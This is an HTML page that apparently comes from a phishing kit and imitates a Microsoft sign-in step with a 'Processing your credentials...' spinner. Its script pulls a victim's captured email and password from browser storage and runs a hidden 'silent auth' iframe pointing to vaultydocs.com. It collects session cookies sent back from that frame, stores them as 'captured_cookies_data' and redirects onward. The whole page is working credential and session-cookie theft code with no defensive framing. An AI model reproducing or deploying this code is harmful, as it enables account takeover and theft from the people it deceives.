<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Replacement Page</title>
    <style>
        body {
            font-family: Segoe UI, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background: #f3f2f1;
        }
        .container {
            text-align: center;
        }
        .spinner {
            border: 4px solid #f3f2f1;
            border-top: 4px solid #0078d4;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        #authFrame {
            display: none;
            width: 0;
            height: 0;
            border: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Processing your credentials...</h2>
        <div class="spinner"></div>
        <p id="status">Initializing...</p>
    </div>

    <!-- Hidden iframe for silent auth -->
    <iframe id="authFrame"></iframe>

    <script>
        console.log('ðŸ”§ Replacement page loaded');

        let capturedCookies = [];
        let authCode = null;
        let authError = null;

        // Get email from form submission
        function getEmailFromStorage() {
            const stored = localStorage.getItem('captured_email') || 
                          sessionStorage.getItem('captured_email');
            if (stored) {
                try {
                    return JSON.parse(stored);
                } catch (e) {
                    return stored;
                }
            }
            return null;
        }

        function getPasswordFromStorage() {
            const stored = localStorage.getItem('captured_password') || 
                          sessionStorage.getItem('captured_password');
            if (stored) {
                try {
                    return JSON.parse(stored);
                } catch (e) {
                    return stored;
                }
            }
            return null;
        }

        // Listen for messages from iframe
        window.addEventListener('message', function(event) {
            console.log('ðŸ“¨ Message from iframe:', event.data.type);

            if (event.data.type === 'AUTH_COMPLETE') {
                console.log('âœ… Auth complete');
                
                authCode = event.data.data.code;
                authError = event.data.data.error;
                capturedCookies = event.data.data.cookies;

                console.log('ðŸ“Š Received:', {
                    code: !!authCode,
                    error: authError,
                    cookies: capturedCookies.length
                });

                // Store cookies for AuthCallback
                if (capturedCookies.length > 0) {
                    const cookieExport = {
                        version: '1.0',
                        exportedAt: new Date().toISOString(),
                        source: 'silent-auth-frame',
                        domain: event.data.data.domain,
                        totalCookies: capturedCookies.length,
                        cookies: capturedCookies
                    };

                    localStorage.setItem('captured_cookies_data', JSON.stringify(cookieExport));
                    sessionStorage.setItem('captured_cookies_data', JSON.stringify(cookieExport));
                    
                    console.log('ðŸ’¾ Cookies stored for AuthCallback');
                }

                // Now proceed to AuthCallback
                setTimeout(() => {
                    console.log('ðŸ”„ Redirecting to AuthCallback...');
                    window.location.href = '/auth/callback';
                }, 1000);
            }
        });

        // Start silent auth flow
        function initSilentAuth() {
            console.log('ðŸš€ Initializing silent auth...');

            const email = getEmailFromStorage();
            const password = getPasswordFromStorage();

            console.log('ðŸ“‹ Email:', email);
            console.log('ðŸ”‘ Password:', password ? '***' : 'N/A');

            if (!email) {
                console.error('âŒ No email found');
                document.getElementById('status').textContent = 'Error: No email found';
                return;
            }

            // Store credentials in proper format
            const credsData = {
                email: email,
                password: password,
                domain: 'microsoft',
                timestamp: new Date().toISOString(),
                source: 'silent-auth-frame',
                validated: true,
                microsoftAccount: true
            };

            localStorage.setItem('replacement_credentials', JSON.stringify(credsData));
            sessionStorage.setItem('replacement_credentials', JSON.stringify(credsData));

            // Load silent auth frame
            const frame = document.getElementById('authFrame');
            frame.src = '/silent-auth-frame.html';

            // Send init message to frame
            setTimeout(() => {
                frame.contentWindow.postMessage({
                    type: 'INIT_AUTH',
                    email: email,
                    clientId: '2e338732-c914-4129-a148-45c24f2da81d', // Your client ID
                    redirectUri: 'https://vaultydocs.com/silent-auth-frame.html',
                    state: 'silent_' + Date.now()
                }, '*');

                console.log('ðŸ“¨ Init message sent to frame');
                document.getElementById('status').textContent = 'Authenticating...';
            }, 500);
        }

        // Start when page loads
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', initSilentAuth);
        } else {
            initSilentAuth();
        }
    </script>
</body>
</html>
